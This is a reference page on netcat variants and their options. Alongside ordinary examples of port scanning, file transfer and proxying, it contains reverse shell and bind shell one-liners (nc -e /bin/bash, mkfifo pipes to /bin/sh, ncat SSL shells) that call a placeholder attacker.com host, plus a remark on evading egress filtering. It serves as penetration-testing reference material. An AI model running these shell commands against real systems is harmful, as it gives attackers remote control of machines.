---
title: Netcat Official Documentation
category: networking
tags:
  - netcat
  - nc
  - ncat
  - reverse-shell
  - bind-shell
  - file-transfer
  - port-scanning
  - tcp
  - udp
last_updated: 2025-12-27
---

# Netcat Official Documentation

## Overview

Netcat (nc) is a versatile command-line networking utility for reading and writing data across network connections using TCP or UDP protocols. Often called the "Swiss Army knife" of networking, it supports TCP/UDP connections, port scanning, file transfers, and shell access.

### Netcat Variants

| Variant | Package | Description |
|---------|---------|-------------|
| **nc.traditional** | `netcat-traditional` | Original Hobbit netcat with `-e` command execution |
| **nc.openbsd** | `netcat-openbsd` | Secure reimplementation; no `-e` by default, adds proxy support |
| **ncat** | `ncat` | Nmap project rewrite with SSL, access control, and connection brokering |
| **GNU netcat** | `netcat` | GNU reimplementation with `-e` support |

### Version Identification

```bash
# Check which variant is installed
nc -h 2>&1 | head -1

# OpenBSD shows: "OpenBSD netcat (Debian patchlevel X.XXX)"
# Traditional shows: "[v1.10-XX]" or similar
# Ncat shows: "Ncat: Version X.XX"
```

---

## OpenBSD Netcat (nc.openbsd)

### Synopsis

```
nc [-46bCDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
   [-m minttl] [-O length] [-P proxy_username] [-p source_port]
   [-q seconds] [-s sourceaddr] [-T keyword] [-V rtable] [-W recvlimit]
   [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]]
   [destination] [port]
```

### Core Options

#### Connection Options

| Option | Description |
|--------|-------------|
| `-4` | Use IPv4 addresses only |
| `-6` | Use IPv6 addresses only |
| `-l` | Listen mode for inbound connections |
| `-n` | Suppress name/port resolution (numeric only) |
| `-p port` | Specify source port for outbound connections |
| `-s sourceaddr` | Specify source address for packets |
| `-v` | Verbose output |
| `-w timeout` | Timeout for connections and final net reads |

#### Protocol Options

| Option | Description |
|--------|-------------|
| `-u` | Use UDP instead of TCP |
| `-U` | Use UNIX-domain sockets |
| `-Z` | DCCP mode |

#### Listen Mode Options

| Option | Description |
|--------|-------------|
| `-k` | Keep listening after client disconnects (requires `-l`) |
| `-W recvlimit` | Terminate after receiving specified number of packets |

#### Scan Options

| Option | Description |
|--------|-------------|
| `-z` | Zero-I/O mode for port scanning |
| `-r` | Randomize port order when scanning |

#### Proxy Options

| Option | Description |
|--------|-------------|
| `-X proto` | Proxy protocol: `4` (SOCKS4), `5` (SOCKS5), `connect` (HTTPS) |
| `-x addr[:port]` | Proxy address and port |
| `-P proxyuser` | Username for proxy authentication |

#### Data Handling

| Option | Description |
|--------|-------------|
| `-C` | Send CRLF as line-ending |
| `-d` | Detach from stdin (do not read from stdin) |
| `-N` | Shutdown network socket after EOF on stdin |
| `-q seconds` | Quit after EOF on stdin and delay of seconds |
| `-i interval` | Delay interval between lines sent |

#### Socket Options

| Option | Description |
|--------|-------------|
| `-b` | Allow broadcast |
| `-D` | Enable debug socket option |
| `-I length` | TCP receive buffer length |
| `-O length` | TCP send buffer length |
| `-M ttl` | Outgoing TTL / Hop Limit |
| `-m minttl` | Minimum incoming TTL / Hop Limit |
| `-S` | Enable RFC 2385 TCP MD5 signature option |
| `-T keyword` | Set TOS value (lowdelay, throughput, reliability, etc.) |

---

## Ncat (Nmap Netcat)

### Synopsis

```
ncat [OPTIONS...] [hostname] [port]
```

### Protocol Options

| Option | Description |
|--------|-------------|
| `-4` | Force IPv4 only |
| `-6` | Force IPv6 only |
| `-u, --udp` | Use UDP (default is TCP) |
| `-U, --unixsock` | Use Unix domain sockets |
| `--sctp` | Use SCTP protocol |
| `--vsock` | Use AF_VSOCK sockets (Linux) |

### Connection Mode Options

| Option | Description |
|--------|-------------|
| `-p, --source-port port` | Specify source port |
| `-s, --source host` | Specify source address |
| `-g hop1[,hop2,...]` | Set IPv4 loose source routing hops |
| `-G ptr` | Set IPv4 source route pointer |

### Listen Mode Options

| Option | Description |
|--------|-------------|
| `-l, --listen` | Listen for connections |
| `-k, --keep-open` | Accept multiple connections |
| `-m, --max-conns n` | Maximum simultaneous connections (default: 100) |
| `--broker` | Enable connection brokering |
| `--chat` | Chat mode with connection brokering |

### SSL/TLS Options

| Option | Description |
|--------|-------------|
| `--ssl` | Enable SSL/TLS encryption |
| `--ssl-verify` | Require server certificate verification |
| `--ssl-cert file` | Specify PEM certificate file |
| `--ssl-key file` | Specify PEM private key file |
| `--ssl-trustfile file` | Trusted certificates for verification |
| `--ssl-ciphers list` | Set ciphersuites to use |
| `--ssl-servername name` | Set TLS SNI extension server name |
| `--ssl-alpn list` | Comma-separated ALPN protocol list |

### Proxy Options

| Option | Description |
|--------|-------------|
| `--proxy host[:port]` | Connect through proxy |
| `--proxy-type proto` | Proxy type: `http`, `socks4`, `socks5` |
| `--proxy-auth user[:pass]` | Proxy authentication credentials |
| `--proxy-dns type` | DNS resolution: `local`, `remote`, `both`, `none` |

### Command Execution Options

| Option | Description |
|--------|-------------|
| `-e, --exec command` | Execute command after connection |
| `-c, --sh-exec command` | Execute command via /bin/sh |
| `--lua-exec file` | Execute Lua script after connection |

**Environment Variables** (available to executed commands):
- `NCAT_REMOTE_ADDR` / `NCAT_REMOTE_PORT` - Remote host IP and port
- `NCAT_LOCAL_ADDR` / `NCAT_LOCAL_PORT` - Local connection endpoint
- `NCAT_PROTO` - Protocol in use (TCP, UDP, SCTP)

### Access Control Options

| Option | Description |
|--------|-------------|
| `--allow host[,host,...]` | Only allow specified hosts to connect |
| `--allowfile file` | Allowed hosts from file (one per line) |
| `--deny host[,host,...]` | Deny specified hosts from connecting |
| `--denyfile file` | Denied hosts from file |

### Timing Options

| Option | Description |
|--------|-------------|
| `-d, --delay time` | Delay between lines sent |
| `-i, --idle-timeout time` | Timeout for idle connections |
| `-w, --wait time` | Connection timeout |
| `-q time` | Wait time after stdin EOF before quitting |

### Output Options

| Option | Description |
|--------|-------------|
| `-v, --verbose` | Verbose output (use multiple times for more) |
| `-o, --output file` | Dump session data to file |
| `-x, --hex-dump file` | Hex dump session data to file |
| `--append-output` | Append to output files instead of overwrite |

### Miscellaneous Options

| Option | Description |
|--------|-------------|
| `-C, --crlf` | Convert LF to CRLF |
| `-n, --nodns` | Disable all hostname resolution |
| `-t, --telnet` | Handle Telnet negotiations |
| `-z` | Zero-I/O mode (report connection status only) |
| `--recv-only` | Only receive data, never send |
| `--send-only` | Only send data, ignore received data |
| `--no-shutdown` | Don't shutdown socket after stdin EOF |

---

## Traditional Netcat (nc.traditional)

### Additional Options

| Option | Description |
|--------|-------------|
| `-e program` | Execute program after connection (security risk!) |
| `-c command` | Execute shell command after connection |
| `-g gateway` | Source routing hop points |
| `-G num` | Source routing pointer |
| `-o file` | Hex dump traffic to file |
| `-t` | Answer Telnet negotiation |

**Security Note**: The `-e` and `-c` options are deliberately omitted from OpenBSD netcat due to security concerns. They allow arbitrary command execution upon connection.

---

## Common Use Cases

### Port Scanning

```bash
# Basic TCP port scan
nc -zv target.com 20-30

# Scan specific ports
nc -zv target.com 22 80 443

# Scan with timeout
nc -zv -w 1 target.com 1-1000

# UDP port scan (less reliable)
nc -zuv target.com 53 123

# Randomized port order
nc -zv -r target.com 1-100
```

### Banner Grabbing

```bash
# Grab SSH banner
nc -v target.com 22

# Grab HTTP banner
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc target.com 80

# Grab SMTP banner with timeout
nc -v -w 3 target.com 25

# Grab multiple banners
echo "QUIT" | nc -v target.com 20-30
```

### File Transfers

**Receiver (set up first):**
```bash
# Basic file receive
nc -lvnp 4444 > received_file

# With ncat, keep listening for multiple files
ncat -lvnkp 4444 > received_file
```

**Sender:**
```bash
# Basic file send
nc target.com 4444 < file_to_send

# Send with EOF signal (OpenBSD)
nc -N target.com 4444 < file_to_send
```

**Directory Transfer:**
```bash
# Receiver
nc -lvnp 4444 | tar xvf -

# Sender
tar cvf - /path/to/directory | nc target.com 4444
```

**With Compression:**
```bash
# Receiver
nc -lvnp 4444 | gunzip > received_file

# Sender
gzip -c file_to_send | nc target.com 4444
```

### Reverse Shells

**Attacker (Listener):**
```bash
# Basic listener
nc -lvnp 4444

# With readline wrapper for better experience
rlwrap nc -lvnp 4444

# Ncat with SSL encryption
ncat --ssl -lvnp 4444

# Keep listening for multiple connections
ncat -lvnkp 4444
```

**Target (with -e support):**
```bash
# Traditional netcat
nc -e /bin/bash attacker.com 4444

# Windows
nc.exe -e cmd.exe attacker.com 4444
```

**Target (without -e - using named pipe):**
```bash
# Most reliable method
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.com 4444 > /tmp/f

# Alternative with bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc attacker.com 4444 > /tmp/f
```

### Bind Shells

**Target (Listener with -e):**
```bash
# Traditional netcat
nc -lvnp 4444 -e /bin/bash

# Ncat with access control
ncat -lvnp 4444 -e /bin/bash --allow 192.168.1.0/24

# Ncat with SSL and access control
ncat --ssl -lvnp 4444 -e /bin/bash --allow 10.0.0.5
```

**Target (Listener without -e):**
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 4444 > /tmp/f
```

**Attacker (Connect):**
```bash
nc target.com 4444

# With SSL (if target uses ncat --ssl)
ncat --ssl target.com 4444
```

### Port Forwarding / Relay

**Simple Relay (Ncat):**
```bash
# Forward local port 8080 to remote port 80
ncat --sh-exec "ncat example.org 80" -l 8080 --keep-open

# Port redirect with verbose output
ncat -l -v 8080 --sh-exec "ncat -v target.com 22"
```

**Using Named Pipes (OpenBSD nc):**
```bash
# Create relay
mkfifo /tmp/fifo
nc -l -p 8080 < /tmp/fifo | nc target.com 80 > /tmp/fifo
```

### Proxy Connections

```bash
# Through HTTP proxy
nc -X connect -x proxy.example.com:3128 target.com 22

# Through SOCKS5 proxy
nc -X 5 -x socks.example.com:1080 target.com 80

# Ncat with proxy authentication
ncat --proxy proxy.example.com:8080 --proxy-type http --proxy-auth user:pass target.com 80
```

### Chat / Simple Communication

```bash
# Server
nc -l -p 1234

# Client
nc server.com 1234

# Ncat chat mode (multiple parties)
ncat -l 1234 --chat
```

### HTTP Client

```bash
# Simple GET request
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n" | nc example.com 80

# POST request
cat << EOF | nc example.com 80
POST /api HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 13
Connection: close

{"key":"val"}
EOF
```

### SSL/TLS Connections (Ncat Only)

```bash
# Connect to HTTPS
ncat --ssl example.com 443

# SSL listener with certificate
ncat --ssl --ssl-cert cert.pem --ssl-key key.pem -lvnp 443

# SSL with certificate verification
ncat --ssl --ssl-verify --ssl-trustfile ca.pem target.com 443

# SSL reverse shell
# Listener
ncat --ssl -lvnp 4444
# Target
ncat --ssl attacker.com 4444 -e /bin/bash
```

---

## Variant Comparison

| Feature | nc.traditional | nc.openbsd | ncat |
|---------|---------------|------------|------|
| `-e` command execution | Yes | No | Yes |
| `-c` shell execution | Yes | No | Yes |
| SSL/TLS support | No | No | Yes |
| SOCKS proxy client | No | Yes | Yes |
| HTTP proxy client | No | Yes | Yes |
| Access control (allow/deny) | No | No | Yes |
| Keep-open mode (`-k`) | No | Yes | Yes |
| Connection brokering | No | No | Yes |
| Lua scripting | No | No | Yes |
| SCTP support | No | No | Yes |
| Unix domain sockets | No | Yes | Yes |
| IPv6 support | Limited | Yes | Yes |
| Hex dump output | Yes | No | Yes |
| Multiple simultaneous connections | No | Limited | Yes |
| DCCP mode | No | Yes | No |

---

## Exit Codes

### OpenBSD Netcat
- Standard Unix exit codes (0 for success, non-zero for error)

### Ncat
| Code | Description |
|------|-------------|
| 0 | No error, connection completed successfully |
| 1 | Network error (e.g., "Connection refused") |
| 2 | Other errors (invalid options, nonexistent files) |

---

## Security Considerations

1. **Command Execution (-e/-c)**: These options create significant security risks. Use with extreme caution and only in controlled environments.

2. **Access Control (Ncat)**: When creating bind shells, always use `--allow` to restrict connections to trusted IPs.

3. **SSL/TLS (Ncat)**: Use `--ssl` for encrypted communications, especially for reverse shells over untrusted networks.

4. **No Authentication**: Netcat provides no built-in authentication. Anyone who can connect has full access.

5. **Firewall Evasion**: Commonly used on ports 80, 443, 8080 to bypass egress filtering.

---

## References

- OpenBSD nc man page: `man nc`
- Ncat Users' Guide: https://nmap.org/ncat/guide/
- Ncat man page: https://man7.org/linux/man-pages/man1/ncat.1.html
